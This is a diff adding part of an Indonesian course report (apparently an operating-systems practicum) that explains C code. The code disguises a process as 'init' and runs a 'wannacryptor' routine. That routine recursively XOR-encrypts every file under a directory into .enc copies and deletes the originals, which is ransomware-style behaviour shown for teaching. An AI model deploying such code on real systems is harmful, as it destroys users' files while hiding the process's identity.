@@ -302,6 +302,116 @@ printf("%s not found. \n\nUsage: %s -m [Filter|Combine Decode]\n", argv[2], argv
 
   <h2 id="soal3">Soal3</h2>
 
+  ### a. /init
+  Dalam soal ini diminta untuk mengubah nama proses menjadi /init. untuk kode yang digunakan seperti ini. 
+
+  ```
+  #include <string.h>
+  #include <sys/prctl.h>
+  extern char *__progname;
+
+  ...
+
+  int main(int argc, char *argv[]) {
+
+  ...
+
+    strcpy(__progname, "init");
+    prctl(PR_SET_NAME, __progname);
+
+  ...
+  
+  }
+  ```
+
+  ### b. Anak Fitur Pertama
+  Untuk anak fitur pertama (bernama wannacryptor) diperluan sebuah fungsi. Tetapi, sebelum itu dibuat fungsi tambahan untuk mengecek apakah ia merupakan directory ( ```int is_directory```) dan untuk enskripsi nama file dengan menambahakn format .enc pada akhir file (```is_encrypted```). Untuk kodenya seperti ini
+
+  ```
+  int is_directory(const char *path) {
+    struct stat statbuf;
+    return (stat(path, &statbuf) == 0 && S_ISDIR(statbuf.st_mode));
+  }
+
+  int is_encrypted(const char *filename) {
+    return strstr(filename, ".enc") != NULL;
+  }
+  ```
+
+  Setelah itu, fungsi ```wannacryptor()``` dibuat dengan melibatkan 2 fungsi yang dijabarkan sebelumnya. Untuk kodenya seperti ini
+  ```
+  void encrypt_file(const char *filepath) {
+    if (is_encrypted(filepath)) return;
+
+    FILE *fp = fopen(filepath, "rb");
+    if (!fp) return;
+
+    char new_filepath[512];
+    snprintf(new_filepath, sizeof(new_filepath), "%s.enc", filepath);
+
+    FILE *fp_out = fopen(new_filepath, "wb");
+    if (!fp_out) {
+        fclose(fp);
+        return;
+    }
+
+    unsigned char buffer[BUFFER_SIZE];
+    size_t bytesRead;
+    while ((bytesRead = fread(buffer, 1, BUFFER_SIZE, fp)) > 0) {
+        for (size_t i = 0; i < bytesRead; i++) {
+            buffer[i] ^= (unsigned char)(xor_key & 0xFF);
+        }
+        fwrite(buffer, 1, bytesRead, fp_out);
+    }
+
+    fclose(fp);
+    fclose(fp_out);
+    remove(filepath);
+}
+
+void scan_and_encrypt(const char *dirpath) {
+    DIR *dir = opendir(dirpath);
+    if (!dir) return;
+
+    struct dirent *entry;
+    char fullpath[1024];
+
+    while ((entry = readdir(dir)) != NULL) {
+        if (!strcmp(entry->d_name, ".") || !strcmp(entry->d_name, "..")) continue;
+
+        snprintf(fullpath, sizeof(fullpath), "%s/%s", dirpath, entry->d_name);
+
+        if (is_directory(fullpath)) {
+            scan_and_encrypt(fullpath);
+        } else {
+            encrypt_file(fullpath);
+        }
+    }
+
+    closedir(dir);
+}
+
+  ```
+
+  Untuk prosesnya sebagai berikut.
+  1) Fungsi ```void encrypt_file(const char *filepath)```
+     - Pertama-tama, fungsi mengambil input berupa file path
+     - Dicek apakah file tersebut ada, jika tidak ada maka ```return```.
+     - Setelah itu dilakukan new_filepath file dengan kode ```snprintf(new_filepath, sizeof(new_filepath), "%s.enc", filepath);```.
+     - Lalu, dilakukan enskripsi dengan kode ```buffer[i] ^= (unsigned char)(xor_key & 0xFF);```.
+     - Jika enskripsi selesai, dilakukan penulisan file .enc ke ```fwrite(buffer, 1, bytesRead, fp_out);```.
+     - Jika proses selesai, ```fp```, ```fp_out``` akan diclose dengan ```fclose()``` dan ```filepath``` akan diremove.
+    
+  2) ```scan_and_encrypt(const char *dirpath)```
+     - Pertama-tama, fungsi mengambil input berupa file path
+     - Dicek apakah file tersebut ada, jika tidak ada maka ```return```.
+     - Lalu dilakukan pengecekan, jika nama file adalah ```.``` atau ```..```, maka fungsi akan ```continue```.
+     - Setelah itu, dilakukan ```sprintf()``` untuk mendapatkan ```full_path``` agar bisa ke tahap selanjutnya.
+     - Dilakukan pengecekan bahwa ```full_path``` merupakan direktori atau bukan. Jika merupakan directory, maka fungsi akan memanggil dirinya sendiri (fungsi rekursif). Sedangkan, jika bukan maka file akan dienskripsi.
+
+  ### c. Anak Fitur Kedua
+  Anak fitur kedua 
+
   <h2 id="soal4">Soal4</h2>
 
 <p>
